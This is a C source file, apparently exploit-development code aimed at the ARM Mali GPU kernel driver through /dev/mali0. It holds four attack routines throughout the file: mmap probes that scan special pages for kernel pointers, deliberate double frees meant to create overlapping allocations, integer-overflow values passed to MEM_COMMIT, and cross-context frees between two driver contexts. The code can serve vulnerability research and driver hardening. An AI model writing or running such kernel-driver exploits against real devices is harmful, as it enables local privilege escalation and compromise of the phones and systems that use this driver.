/*
 * mali_exploit2.c — Exploit Mali double-free, special mmap, and integer overflow
 *
 * CONFIRMED VULNS:
 * 1. FLAGS_CHANGE accepts ANY flag change (no validation)
 * 2. DOUBLE FREE accepted (gpu_free succeeds twice)
 * 3. MEM_COMMIT(-1) and MEM_COMMIT(0xFFFF...) accepted (integer overflow)
 * 4. Special mmap at pgoff=3 succeeds → maps tracking/debug page
 *
 * Strategy: Use special mmap page to leak info, exploit double-free
 * for overlapping allocations, combine with MEM_COMMIT overflow.
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/ioctl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#define DEV_PATH "/dev/mali0"
#define PAGE_SIZE 4096

struct uk_header { uint32_t id; uint32_t ret; };

static unsigned int make_cmd(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 'M', 0, sz);
}

static void *do_mmap2(void *a, size_t l, int p, int f, int fd, unsigned long pg) {
    return (void*)syscall(__NR_mmap2, a, l, p, f, fd, pg);
}

static void hexdump(const void *data, size_t len) {
    const uint8_t *p = data;
    for (size_t i = 0; i < len; i += 16) {
        fprintf(stderr, "  %04zx: ", i);
        for (size_t j = 0; j < 16 && i+j < len; j++)
            fprintf(stderr, "%02x ", p[i+j]);
        fprintf(stderr, "  ");
        for (size_t j = 0; j < 16 && i+j < len; j++) {
            uint8_t c = p[i+j];
            fprintf(stderr, "%c", (c >= 32 && c < 127) ? c : '.');
        }
        fprintf(stderr, "\n");
    }
}

#include <setjmp.h>
#include <signal.h>

static int mali_fd;
static sigjmp_buf jmp_env;
static volatile int got_fault = 0;

static void fault_handler(int sig) {
    (void)sig;
    got_fault = 1;
    siglongjmp(jmp_env, 1);
}

/* Safely read a u32; returns 0xFFFFFFFF on fault */
static uint32_t safe_read32(volatile uint32_t *addr) {
    struct sigaction sa, old_sa;
    sa.sa_handler = fault_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    sigaction(SIGSEGV, &sa, &old_sa);
    sigaction(SIGBUS, &sa, NULL);

    got_fault = 0;
    uint32_t val = 0xFFFFFFFF;
    if (sigsetjmp(jmp_env, 1) == 0) {
        val = *addr;
    }
    sigaction(SIGSEGV, &old_sa, NULL);
    sigaction(SIGBUS, &old_sa, NULL);
    return val;
}

static int do_handshake(void) {
    uint8_t hb[16];
    memset(hb, 0, 16); ((struct uk_header*)hb)->id = 0; hb[8] = 10;
    if (ioctl(mali_fd, make_cmd(16), hb) < 0) return -1;
    memset(hb, 0, 16); ((struct uk_header*)hb)->id = 530;
    if (ioctl(mali_fd, make_cmd(16), hb) < 0) return -1;
    return 0;
}

static uint64_t gpu_alloc(uint32_t pages, uint32_t flags) {
    uint8_t buf[56];
    memset(buf, 0, 56);
    ((struct uk_header*)buf)->id = 512;
    *(uint64_t*)(buf + 8) = pages;
    *(uint64_t*)(buf + 16) = pages;
    *(uint32_t*)(buf + 32) = flags;
    if (ioctl(mali_fd, make_cmd(56), buf) < 0) return 0;
    return *(uint64_t*)(buf + 40);
}

static int gpu_free(uint64_t va) {
    uint8_t buf[16];
    memset(buf, 0, 16);
    ((struct uk_header*)buf)->id = 516;
    *(uint64_t*)(buf + 8) = va;
    return ioctl(mali_fd, make_cmd(16), buf);
}

static int gpu_commit(uint64_t va, int64_t pages) {
    uint8_t buf[32];
    memset(buf, 0, 32);
    ((struct uk_header*)buf)->id = 514;
    *(uint64_t*)(buf + 8) = va;
    *(int64_t*)(buf + 16) = pages;
    return ioctl(mali_fd, make_cmd(32), buf);
}

/* ============================================================ */
/* TEST 1: Investigate special mmap pages                        */
/* ============================================================ */
static void test_special_mmap(void) {
    fprintf(stderr, "\n=== TEST 1: Special mmap pages ===\n");

    /* Try all small pgoffs to find all special handles */
    for (unsigned long pg = 0; pg <= 16; pg++) {
        void *p = do_mmap2(NULL, PAGE_SIZE, PROT_READ, MAP_SHARED, mali_fd, pg);
        if (p != MAP_FAILED) {
            uint32_t v = safe_read32((volatile uint32_t*)p);
            if (got_fault) {
                fprintf(stderr, "[+] pgoff=%lu → %p (SEGFAULT on read — guard/trap page)\n", pg, p);
            } else {
                fprintf(stderr, "[+] pgoff=%lu → %p, first u32=0x%08x\n", pg, p, v);

                /* Scan for kernel pointers */
                for (int i = 0; i < 256; i++) {
                    uint32_t val = safe_read32(&((volatile uint32_t*)p)[i]);
                    if (!got_fault && (val & 0xF0000000) == 0xC0000000) {
                        fprintf(stderr, "  [!] Kernel ptr at +%d: 0x%08x\n", i*4, val);
                    }
                }
            }

            /* Check if writable */
            void *pw = do_mmap2(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                                MAP_SHARED, mali_fd, pg);
            if (pw != MAP_FAILED) {
                fprintf(stderr, "  [!] Also writable @ %p\n", pw);
                munmap(pw, PAGE_SIZE);
            }

            munmap(p, PAGE_SIZE);
        }
    }

    /* Also try some larger pgoffs that correspond to known handle values */
    unsigned long special[] = {
        0x1000, 0x2000, 0x3000, 0x4000,
        0xFD000, 0xFE000, 0xFF000,
    };
    for (int i = 0; i < 7; i++) {
        void *p = do_mmap2(NULL, PAGE_SIZE, PROT_READ, MAP_SHARED,
                           mali_fd, special[i]);
        if (p != MAP_FAILED) {
            fprintf(stderr, "[+] pgoff=0x%lx → %p\n", special[i], p);
            hexdump(p, 64);
            munmap(p, PAGE_SIZE);
        }
    }
}

/* ============================================================ */
/* TEST 2: Double free exploitation                              */
/* ============================================================ */
static void test_double_free_exploit(void) {
    fprintf(stderr, "\n=== TEST 2: Double free exploitation ===\n");

    uint32_t flags = 0x0F; /* CPU_RD|CPU_WR|GPU_RD|GPU_WR */

    /* Allocate region A */
    uint64_t va_a = gpu_alloc(1, flags);
    fprintf(stderr, "[+] Region A @ 0x%08llx\n", (unsigned long long)va_a);

    /* Free A twice */
    int r1 = gpu_free(va_a);
    fprintf(stderr, "[*] Free A (1st): %d\n", r1);
    int r2 = gpu_free(va_a);
    fprintf(stderr, "[*] Free A (2nd): %d\n", r2);

    /* Now allocate two new regions — one might reuse A's internal structures */
    uint64_t va_b = gpu_alloc(1, flags);
    uint64_t va_c = gpu_alloc(1, flags);
    fprintf(stderr, "[*] Region B @ 0x%08llx\n", (unsigned long long)va_b);
    fprintf(stderr, "[*] Region C @ 0x%08llx\n", (unsigned long long)va_c);

    /* Check if B and C got the same physical pages (overlap) */
    if (va_b == va_c) {
        fprintf(stderr, "[!] B and C have SAME GPU VA — internal state corrupted!\n");
    }

    /* Free everything cleanly */
    gpu_free(va_b);
    gpu_free(va_c);

    /* More aggressive: allocate, free, double-free, then alloc many */
    fprintf(stderr, "\n[*] Stress testing double-free allocator corruption...\n");
    for (int trial = 0; trial < 5; trial++) {
        uint64_t va = gpu_alloc(1, flags);
        gpu_free(va);
        gpu_free(va); /* double free */

        /* Allocate several */
        uint64_t vas[10];
        int n = 0;
        for (int i = 0; i < 10; i++) {
            vas[i] = gpu_alloc(1, flags);
            if (vas[i]) n++;
        }

        /* Check for duplicates (would indicate use-after-free) */
        for (int i = 0; i < n; i++) {
            for (int j = i + 1; j < n; j++) {
                if (vas[i] == vas[j] && vas[i]) {
                    fprintf(stderr, "[!!] DUPLICATE VA: vas[%d] == vas[%d] == 0x%08llx!\n",
                            i, j, (unsigned long long)vas[i]);
                }
            }
        }

        for (int i = 0; i < n; i++)
            if (vas[i]) gpu_free(vas[i]);

        fprintf(stderr, "  trial %d: %d allocs, VAs:", trial, n);
        for (int i = 0; i < n && i < 5; i++)
            fprintf(stderr, " 0x%llx", (unsigned long long)vas[i]);
        fprintf(stderr, "\n");
    }
}

/* ============================================================ */
/* TEST 3: MEM_COMMIT integer overflow exploitation              */
/* ============================================================ */
static void test_commit_overflow(void) {
    fprintf(stderr, "\n=== TEST 3: MEM_COMMIT integer overflow ===\n");

    /* Allocate with GROW_ON_GPF, small VA space */
    uint32_t flags = 0x0F | (1U << 9); /* + GROW_ON_GPF */
    uint8_t ab[56];
    memset(ab, 0, 56);
    ((struct uk_header*)ab)->id = 512;
    *(uint64_t*)(ab + 8) = 4;   /* va_pages=4 */
    *(uint64_t*)(ab + 16) = 1;  /* commit_pages=1 */
    *(uint64_t*)(ab + 24) = 3;  /* extent=3 */
    *(uint32_t*)(ab + 32) = flags;

    if (ioctl(mali_fd, make_cmd(56), ab) < 0) return;
    uint64_t va = *(uint64_t*)(ab + 40);
    if (!va) return;
    fprintf(stderr, "[+] Growable region @ 0x%08llx (1/4 pages committed)\n",
            (unsigned long long)va);

    /* Try various commit values to find integer overflow behavior */
    int64_t commit_vals[] = {
        1,       /* normal: grow by 1 page */
        -1,      /* integer overflow: shrink by 1 (below 0?) */
        -2,      /* shrink by 2 */
        0x7FFFFFFF, /* max positive i32 */
        -0x7FFFFFFF, /* max negative i32 */
    };

    for (int i = 0; i < 5; i++) {
        int r = gpu_commit(va, commit_vals[i]);
        fprintf(stderr, "[*] COMMIT(%lld): ioctl=%d, errno=%d\n",
                (long long)commit_vals[i], r, (r < 0) ? errno : 0);
    }

    /* Check the region's current state */
    uint8_t qb[32];
    memset(qb, 0, 32);
    ((struct uk_header*)qb)->id = 515; /* MEM_QUERY */
    *(uint64_t*)(qb + 8) = va;
    *(uint64_t*)(qb + 16) = 1; /* query type: committed size */
    if (ioctl(mali_fd, make_cmd(32), qb) >= 0) {
        fprintf(stderr, "[*] QUERY result: ");
        hexdump(qb, 32);
    }

    gpu_free(va);
}

/* ============================================================ */
/* TEST 4: Multiple context race (open two Mali fds)             */
/* ============================================================ */
static void test_multi_context(void) {
    fprintf(stderr, "\n=== TEST 4: Multi-context test ===\n");

    int fd2 = open(DEV_PATH, O_RDWR | O_CLOEXEC);
    if (fd2 < 0) return;

    uint8_t hb[16];
    memset(hb, 0, 16); ((struct uk_header*)hb)->id = 0; hb[8] = 10;
    ioctl(fd2, make_cmd(16), hb);
    memset(hb, 0, 16); ((struct uk_header*)hb)->id = 530;
    ioctl(fd2, make_cmd(16), hb);

    fprintf(stderr, "[+] Second context on fd=%d\n", fd2);

    /* Allocate on both contexts */
    uint64_t va1 = gpu_alloc(1, 0x0F);
    fprintf(stderr, "[*] ctx1 alloc: 0x%llx\n", (unsigned long long)va1);

    /* Allocate on fd2 */
    uint8_t ab[56];
    memset(ab, 0, 56);
    ((struct uk_header*)ab)->id = 512;
    *(uint64_t*)(ab + 8) = 1;
    *(uint64_t*)(ab + 16) = 1;
    *(uint32_t*)(ab + 32) = 0x0F;
    ioctl(fd2, make_cmd(56), ab);
    uint64_t va2 = *(uint64_t*)(ab + 40);
    fprintf(stderr, "[*] ctx2 alloc: 0x%llx\n", (unsigned long long)va2);

    /* Try to free ctx1's region from ctx2 (cross-context free) */
    uint8_t fb[16];
    memset(fb, 0, 16);
    ((struct uk_header*)fb)->id = 516;
    *(uint64_t*)(fb + 8) = va1;
    int r = ioctl(fd2, make_cmd(16), fb);
    fprintf(stderr, "[*] Cross-context free (ctx1 region from ctx2): %d\n", r);

    if (r >= 0) {
        fprintf(stderr, "[!!!] CROSS-CONTEXT FREE SUCCEEDED!\n");
    }

    /* Try to mmap ctx1's special pages from ctx2 */
    void *p = do_mmap2(NULL, PAGE_SIZE, PROT_READ, MAP_SHARED, fd2, 3);
    if (p != MAP_FAILED) {
        fprintf(stderr, "[+] ctx2 special mmap(3) @ %p\n", p);
        hexdump(p, 64);
        munmap(p, PAGE_SIZE);
    }

    gpu_free(va1);
    memset(fb, 0, 16);
    ((struct uk_header*)fb)->id = 516;
    *(uint64_t*)(fb + 8) = va2;
    ioctl(fd2, make_cmd(16), fb);

    close(fd2);
}

int main(void) {
    fprintf(stderr, "=== Mali r7p0 Exploit v2 ===\n\n");

    mali_fd = open(DEV_PATH, O_RDWR | O_CLOEXEC);
    if (mali_fd < 0) { perror("open"); return 1; }
    if (do_handshake() < 0) {
        fprintf(stderr, "handshake fail\n");
        close(mali_fd);
        return 1;
    }
    fprintf(stderr, "[+] Ready\n");

    test_special_mmap();
    test_double_free_exploit();
    test_commit_overflow();
    test_multi_context();

    close(mali_fd);
    fprintf(stderr, "\n=== Done ===\n");
    return 0;
}
